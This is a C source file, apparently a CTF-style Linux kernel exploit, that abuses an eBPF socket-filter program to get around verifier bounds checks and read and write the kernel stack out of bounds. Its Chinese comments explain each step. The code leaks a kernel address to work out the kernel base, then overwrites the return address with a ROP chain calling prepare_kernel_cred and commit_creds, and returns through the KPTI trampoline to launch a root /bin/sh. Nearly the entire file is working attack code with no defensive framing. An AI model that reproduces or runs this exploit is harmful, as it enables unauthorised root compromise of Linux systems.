#include <errno.h>
#include <fcntl.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <linux/bpf.h>
#include <linux/unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/stat.h>
#include <sys/personality.h>

#define BPF_JMP32 0x06
#define BPF_JLT 0xa0

char buffer[64];
int sockets[2];
int mapfd, progfd;
int doredact = 0;

#define LOG_BUF_SIZE 0x100000
char bpf_log_buf[LOG_BUF_SIZE];

static __u64 ptr_to_u64(void *ptr)
{
	return (__u64) (unsigned long) ptr;
}

int bpf_prog_load(enum bpf_prog_type prog_type,
		  const struct bpf_insn *insns, int prog_len,
		  const char *license, int kern_version)
{
	union bpf_attr attr = {
		.prog_type = prog_type,
		.insns = ptr_to_u64((void *) insns),
		.insn_cnt = prog_len / sizeof(struct bpf_insn),
		.license = ptr_to_u64((void *) license),
		.log_buf = ptr_to_u64(bpf_log_buf),
		.log_size = LOG_BUF_SIZE,
		.log_level = 1,
	};

	attr.kern_version = kern_version;

	bpf_log_buf[0] = 0;

	return syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));
}

int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size,
		   int max_entries, int map_flags)
{
	union bpf_attr attr = {
		.map_type = map_type,
		.key_size = key_size,
		.value_size = value_size,
		.max_entries = max_entries
	};

	return syscall(__NR_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));
}

static int bpf_update_elem(uint64_t key, uint64_t value) 
{
	union bpf_attr attr = {
		.map_fd = mapfd,
		.key = (__u64)&key,
		.value = (__u64)&value,
		.flags = 0,
	};

	return syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}

static int bpf_lookup_elem(void *key, void *value) 
{
	union bpf_attr attr = {
		.map_fd = mapfd,
		.key = (__u64)key,
		.value = (__u64)value,
	};

	return syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));
}


#define BPF_ALU64_IMM(OP, DST, IMM)				\
	((struct bpf_insn) {					\
		.code  = BPF_ALU64 | BPF_OP(OP) | BPF_K,	\
		.dst_reg = DST,					\
		.src_reg = 0,					\
		.off   = 0,					\
		.imm   = IMM })
#define BPF_ALU64_REG(OP, DST, SRC)				\
	((struct bpf_insn) {					\
		.code  = BPF_ALU64 | BPF_OP(OP) | BPF_X,	\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = 0,					\
		.imm   = 0 })
#define BPF_ALU32_IMM(OP, DST, IMM)				\
	((struct bpf_insn) {					\
		.code  = BPF_ALU | BPF_OP(OP) | BPF_K,		\
		.dst_reg = DST,					\
		.src_reg = 0,					\
		.off   = 0,					\
		.imm   = IMM })
#define BPF_ALU32_REG(OP, DST, SRC)				\
	((struct bpf_insn) {					\
		.code  = BPF_ALU | BPF_OP(OP) | BPF_X,		\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = 0,					\
		.imm   = 0 })

#define BPF_MOV64_REG(DST, SRC)					\
	((struct bpf_insn) {					\
		.code  = BPF_ALU64 | BPF_MOV | BPF_X,		\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = 0,					\
		.imm   = 0 })

#define BPF_MOV32_REG(DST, SRC)					\
	((struct bpf_insn) {					\
		.code  = BPF_ALU | BPF_MOV | BPF_X,		\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = 0,					\
		.imm   = 0 })

#define BPF_MOV64_IMM(DST, IMM)					\
	((struct bpf_insn) {					\
		.code  = BPF_ALU64 | BPF_MOV | BPF_K,		\
		.dst_reg = DST,					\
		.src_reg = 0,					\
		.off   = 0,					\
		.imm   = IMM })

#define BPF_MOV32_IMM(DST, IMM)					\
	((struct bpf_insn) {					\
		.code  = BPF_ALU | BPF_MOV | BPF_K,		\
		.dst_reg = DST,					\
		.src_reg = 0,					\
		.off   = 0,					\
		.imm   = IMM })

#define BPF_LD_IMM64(DST, IMM)					\
	BPF_LD_IMM64_RAW(DST, 0, IMM)

#define BPF_LD_IMM64_RAW(DST, SRC, IMM)				\
	((struct bpf_insn) {					\
		.code  = BPF_LD | BPF_DW | BPF_IMM,		\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = 0,					\
		.imm   = (__u32) (IMM) }),			\
	((struct bpf_insn) {					\
		.code  = 0, 					\
		.dst_reg = 0,					\
		.src_reg = 0,					\
		.off   = 0,					\
		.imm   = ((__u64) (IMM)) >> 32 })

#ifndef BPF_PSEUDO_MAP_FD
# define BPF_PSEUDO_MAP_FD	1
#endif

#define BPF_LD_IMM64(DST, IMM)					\
	BPF_LD_IMM64_RAW(DST, 0, IMM)

#define BPF_LD_MAP_FD(DST, MAP_FD)				\
	BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)

#define BPF_LDX_MEM(SIZE, DST, SRC, OFF)			\
	((struct bpf_insn) {					\
		.code  = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM,	\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = OFF,					\
		.imm   = 0 })

#define BPF_STX_MEM(SIZE, DST, SRC, OFF)			\
	((struct bpf_insn) {					\
		.code  = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM,	\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = OFF,					\
		.imm   = 0 })

#define BPF_ST_MEM(SIZE, DST, OFF, IMM)				\
	((struct bpf_insn) {					\
		.code  = BPF_ST | BPF_SIZE(SIZE) | BPF_MEM,	\
		.dst_reg = DST,					\
		.src_reg = 0,					\
		.off   = OFF,					\
		.imm   = IMM })

/* Unconditional jumps, goto pc + off16 */

#define BPF_JMP_A(OFF)						\
	((struct bpf_insn) {					\
		.code  = BPF_JMP | BPF_JA,			\
		.dst_reg = 0,					\
		.src_reg = 0,					\
		.off   = OFF,					\
		.imm   = 0 })

#define BPF_JMP32_REG(OP, DST, SRC, OFF)			\
	((struct bpf_insn) {					\
		.code  = BPF_JMP32 | BPF_OP(OP) | BPF_X,	\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = OFF,					\
		.imm   = 0 })

/* Like BPF_JMP_IMM, but with 32-bit wide operands for comparison. */

#define BPF_JMP32_IMM(OP, DST, IMM, OFF)			\
	((struct bpf_insn) {					\
		.code  = BPF_JMP32 | BPF_OP(OP) | BPF_K,	\
		.dst_reg = DST,					\
		.src_reg = 0,					\
		.off   = OFF,					\
		.imm   = IMM })

#define BPF_JMP_REG(OP, DST, SRC, OFF)				\
	((struct bpf_insn) {					\
		.code  = BPF_JMP | BPF_OP(OP) | BPF_X,		\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = OFF,					\
		.imm   = 0 })

#define BPF_JMP_IMM(OP, DST, IMM, OFF)				\
	((struct bpf_insn) {					\
		.code  = BPF_JMP | BPF_OP(OP) | BPF_K,		\
		.dst_reg = DST,					\
		.src_reg = 0,					\
		.off   = OFF,					\
		.imm   = IMM })

#define BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM)			\
	((struct bpf_insn) {					\
		.code  = CODE,					\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = OFF,					\
		.imm   = IMM })

#define BPF_EXIT_INSN()						\
	((struct bpf_insn) {					\
		.code  = BPF_JMP | BPF_EXIT,			\
		.dst_reg = 0,					\
		.src_reg = 0,					\
		.off   = 0,					\
		.imm   = 0 })

#define BPF_MAP_GET(idx, dst)                                                        \
	BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),              /* r1 = r9                */   \
	BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),             /* r2 = fp                */   \
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),            /* r2 = fp - 4            */   \
	BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx),           /* *(u32 *)(fp - 4) = idx */   \
	BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),             \
	BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),            /* if (r0 == 0)           */   \
	BPF_EXIT_INSN(),                                  /*   exit(0);             */   \
	BPF_LDX_MEM(BPF_DW, (dst), BPF_REG_0, 0)          /* r_dst = *(u64 *)(r0)   */              

#define BPF_MAP_GET_ADDR(idx, dst)                                                        \
	BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),              /* r1 = r9                */   \
	BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),             /* r2 = fp                */   \
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),            /* r2 = fp - 4            */   \
	BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx),           /* *(u32 *)(fp - 4) = idx */   \
	BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),             \
	BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),            /* if (r0 == 0)           */   \
	BPF_EXIT_INSN(),                                  /*   exit(0);             */   \
	BPF_MOV64_REG((dst), BPF_REG_0)          	  /* r_dst = (r0)   */              

/* Memory load, dst_reg = *(uint *) (src_reg + off16) */

#define BPF_LDX_MEM(SIZE, DST, SRC, OFF)			\
	((struct bpf_insn) {					\
		.code  = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM,	\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = OFF,					\
		.imm   = 0 })

/* Memory store, *(uint *) (dst_reg + off16) = src_reg */

#define BPF_STX_MEM(SIZE, DST, SRC, OFF)			\
	((struct bpf_insn) {					\
		.code  = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM,	\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = OFF,					\
		.imm   = 0 })

static void __exit(char *err) 
{
	fprintf(stderr, "error: %s\n", err);
	exit(-1);
}

static void writemsg(void) 
{
	char buffer[64];

	ssize_t n = write(sockets[0], buffer, sizeof(buffer));

	if (n < 0) {
		perror("write");
		return;
	}
	if (n != sizeof(buffer))
		fprintf(stderr, "short write: %lu\n", n);
}

static void update_elem(uint64_t op,uint64_t content,uint32_t addr_offset)
{

	bpf_update_elem(0, op);
	bpf_update_elem(1, content);
	bpf_update_elem(2, addr_offset + 0x2000000000);
	writemsg();
}

static uint64_t get_value(uint32_t addr_offset) 
{
	uint64_t value = 0;
	uint64_t key = 1;
	update_elem(0,0,addr_offset);
	if (bpf_lookup_elem(&key, &value))
		__exit(strerror(errno));

	return value;
}

static void update_stack_rop(uint64_t value,uint64_t content,uint32_t addr_offset, unsigned long *rop)
{

	bpf_update_elem(0, value);
	bpf_update_elem(1, content);
	bpf_update_elem(2, addr_offset + 0x2000000000);
    for(int i = 1; i < 15; i++){
	    bpf_update_elem(i+2, rop[i]);
    }
	writemsg();
}

static void set_value(uint64_t value, uint32_t addr_offset, unsigned long *rop)
{
	update_stack_rop(value, 0, addr_offset, rop);//write
}

static int load_my_prog()
{
	struct bpf_insn my_prog[] = {

		BPF_LD_MAP_FD(BPF_REG_9,mapfd),
		BPF_MAP_GET(2,BPF_REG_8),	//address offset

		BPF_LD_IMM64(BPF_REG_2,0x4000000000),			
		BPF_LD_IMM64(BPF_REG_3,0x2000000000),			
		BPF_LD_IMM64(BPF_REG_4,0xFFFFffff),			
		BPF_LD_IMM64(BPF_REG_5,0x1),			
		
		BPF_JMP_REG(BPF_JGT,BPF_REG_8,BPF_REG_2,5), 
		BPF_JMP_REG(BPF_JLT,BPF_REG_8,BPF_REG_3,4),
		BPF_JMP32_REG(BPF_JGT,BPF_REG_8,BPF_REG_4,3),   // return 0
		BPF_JMP32_REG(BPF_JLT,BPF_REG_8,BPF_REG_5,2),	// n -1  return -1
		
		
		BPF_ALU64_REG(BPF_AND,BPF_REG_8,BPF_REG_4),	
		BPF_JMP_IMM(BPF_JA, 0, 0, 2),
		
		BPF_MOV64_IMM(BPF_REG_0,0x0),			
		BPF_EXIT_INSN(),
		
		
		BPF_MOV64_REG(BPF_REG_7,BPF_REG_10), // 对栈指针进行越界读写
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, -256),  // 开辟栈空间，-256 ，则patch那里的alu_limit就为255，r8的范围为[0,255]           
		BPF_STX_MEM(BPF_DW,BPF_REG_7,BPF_REG_8,0),

		// add 8 times 传入r8=0x21时， 所以sp-256+0x21*8=sp+8，就栈溢出了

		BPF_ALU64_REG(BPF_ADD,BPF_REG_7,BPF_REG_8),
		BPF_ALU64_REG(BPF_ADD,BPF_REG_7,BPF_REG_8),
		BPF_ALU64_REG(BPF_ADD,BPF_REG_7,BPF_REG_8),
		BPF_ALU64_REG(BPF_ADD,BPF_REG_7,BPF_REG_8),

		BPF_ALU64_REG(BPF_ADD,BPF_REG_7,BPF_REG_8),
		BPF_ALU64_REG(BPF_ADD,BPF_REG_7,BPF_REG_8),
		BPF_ALU64_REG(BPF_ADD,BPF_REG_7,BPF_REG_8),
		BPF_ALU64_REG(BPF_ADD,BPF_REG_7,BPF_REG_8),

		BPF_MOV64_REG(BPF_REG_6,BPF_REG_7),

		
		BPF_MAP_GET_ADDR(1,BPF_REG_7),  //泄露栈里的内核地址

		BPF_LDX_MEM(BPF_DW,BPF_REG_0,BPF_REG_6,0),
		BPF_STX_MEM(BPF_DW,BPF_REG_7,BPF_REG_0,0),

        //----------------------------------------------------
        //
		BPF_MAP_GET(0,BPF_REG_7),	//op or value r7=map[0]
		BPF_JMP_IMM(BPF_JNE, BPF_REG_7, 0, 2), // 如果r7=0，表示只是泄露，结束这次bpf_prog_run，否则就对栈开始覆盖
		BPF_MOV64_IMM(BPF_REG_0,0x0),			
		BPF_EXIT_INSN(),

		BPF_STX_MEM(BPF_DW, BPF_REG_6, BPF_REG_7, 0), //if r6!=0, r6 is writed into stack rop[0]		
													  //map[0] 不为0时，就将map[0] 写入sp+8，覆盖返回地址	

		BPF_MOV64_REG(BPF_REG_7,BPF_REG_6), // 重新获得之前叠加完偏移的栈指针
		BPF_MAP_GET(3,BPF_REG_6),	        // 从map[3]->map[16]分别保存rop[1]->rop[14]，rop[0]保存在map[0]中。
        
		BPF_ALU64_IMM(BPF_RSH,BPF_REG_8, 2), // r8=0x21 -> r8=0x8            
		BPF_ALU64_REG(BPF_ADD,BPF_REG_7,BPF_REG_8),
		BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_6, 0), // rop[1] 		
        
		BPF_MAP_GET(4,BPF_REG_6),	
		BPF_ALU64_REG(BPF_ADD,BPF_REG_7,BPF_REG_8), //rop[2]
		BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_6, 0), 		
        
        BPF_MAP_GET(5,BPF_REG_6),
		BPF_ALU64_REG(BPF_ADD,BPF_REG_7,BPF_REG_8), //rop[3]
		BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_6, 0), 

        BPF_MAP_GET(6,BPF_REG_6),
		BPF_ALU64_REG(BPF_ADD,BPF_REG_7,BPF_REG_8), //rop[4]
		BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_6, 0), 

        BPF_MAP_GET(7,BPF_REG_6),
		BPF_ALU64_REG(BPF_ADD,BPF_REG_7,BPF_REG_8), //rop[5]
		BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_6, 0),  

        BPF_MAP_GET(8,BPF_REG_6),	
		BPF_ALU64_REG(BPF_ADD,BPF_REG_7,BPF_REG_8), //rop[6]
		BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_6, 0),  

        BPF_MAP_GET(9,BPF_REG_6),
		BPF_ALU64_REG(BPF_ADD,BPF_REG_7,BPF_REG_8), //rop[7]
		BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_6, 0),  

        BPF_MAP_GET(10,BPF_REG_6),	
        BPF_ALU64_REG(BPF_ADD,BPF_REG_7,BPF_REG_8), //rop[8]
        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_6, 0),

        BPF_MAP_GET(11,BPF_REG_6),	
		BPF_ALU64_REG(BPF_ADD,BPF_REG_7,BPF_REG_8), //rop[9]
		BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_6, 0),

        BPF_MAP_GET(12,BPF_REG_6),	
		BPF_ALU64_REG(BPF_ADD,BPF_REG_7,BPF_REG_8), //rop[10]
		BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_6, 0),
        
        BPF_MAP_GET(13,BPF_REG_6),	
		BPF_ALU64_REG(BPF_ADD,BPF_REG_7,BPF_REG_8), //rop[11]
		BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_6, 0),
        
        BPF_MAP_GET(14,BPF_REG_6),	
		BPF_ALU64_REG(BPF_ADD,BPF_REG_7,BPF_REG_8), //rop[12]
		BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_6, 0),

        BPF_MAP_GET(15,BPF_REG_6),
		BPF_ALU64_REG(BPF_ADD,BPF_REG_7,BPF_REG_8), //rop[13]
		BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_6, 0),

        BPF_MAP_GET(16,BPF_REG_6),	
		BPF_ALU64_REG(BPF_ADD,BPF_REG_7,BPF_REG_8), //rop[14]
		BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_6, 0),
		
		BPF_MOV64_IMM(BPF_REG_0,0x0),			
		BPF_EXIT_INSN(),
	};
	return bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER,my_prog,sizeof(my_prog),"GPL",0);
}

static void prep(void) 
{
	mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY,sizeof(int),sizeof(long long),20,0);
	if(mapfd < 0){
		__exit(strerror(errno));
	}

	progfd =  load_my_prog();
	if(progfd < 0){
		printf("%s\n",bpf_log_buf);
		__exit(strerror(errno));
	}
	//printf("%s\n",bpf_log_buf);
	
	if(socketpair(AF_UNIX,SOCK_DGRAM,0,sockets)){
		__exit(strerror(errno));
	}
	
	if(setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(progfd)) < 0){
		__exit(strerror(errno));
	}
}

unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_stat() {
    asm(
        "movq %%cs, %0;"
        "movq %%ss, %1;"
        "movq %%rsp, %2;"
        "pushfq;"
        "popq %3;"
        : "=r" (user_cs), "=r" (user_ss), "=r" (user_sp), "=r" (user_rflags) : : "memory");
}

void shell()
{
    if(!getuid())
    {
        printf("[+] you got root!\n");
        system("/bin/sh");
    }
    else
    {
        printf("[T.T] privilege escalation failed !!!\n");
    }
    exit(0);

}

static void pwn(void)
{
	save_stat();
	uint64_t leak_addr, kernel_base;
	leak_addr = get_value(0x21);	
	printf("[+] leak addr:0x%lX\n", leak_addr);
	kernel_base = leak_addr & 0xffffffffff000000;  
	printf("[+] leak kernel base:0x%lX\n", kernel_base);

    unsigned long prepare_kernel = kernel_base + 0x08f610; 
    unsigned long commit_creds = kernel_base + 0x08f1e0;  
    unsigned long rdi_to_cr4_ret = kernel_base + 0x0635B4; // mov cr4, rdi; pop rbp; ret
    unsigned long pop_rdi_ret = kernel_base + 0x00175b; //: pop rdi; ret; 
    unsigned long mov_rdi_rax = kernel_base + 0x16da8b;// mov rdi, rax; mov rax, rdi; pop rbx; pop rbp; ret; 
    unsigned long kpti_ret = kernel_base + 0xc00a2f+0x16; // swapgs_restore_regs_and_return_to_usermode
   

    unsigned long rop[32] = {0};
    int i = 0;
    rop[i++] = pop_rdi_ret;            //0 
    rop[i++] = 0;                      //1
    rop[i++] = prepare_kernel;         //2
    rop[i++] = mov_rdi_rax;            //3       
    rop[i++] = 0;                      //4
    rop[i++] = 0;                      //5
    rop[i++] = commit_creds;           //6  
    rop[i++] = kpti_ret;               //7  
    rop[i++] = 0;                      //8
    rop[i++] = 0;                      //9 
    rop[i++] = &shell;                 //10 
    rop[i++] = user_cs;                //11 
    rop[i++] = user_rflags;            //12
    rop[i++] = user_sp;                //13   
    rop[i++] = user_ss;                //14
        
	set_value(rop[0], 0x21, &rop); //write into stack ret
}

int main(void){

	prep();
	pwn();
	return 0;
}
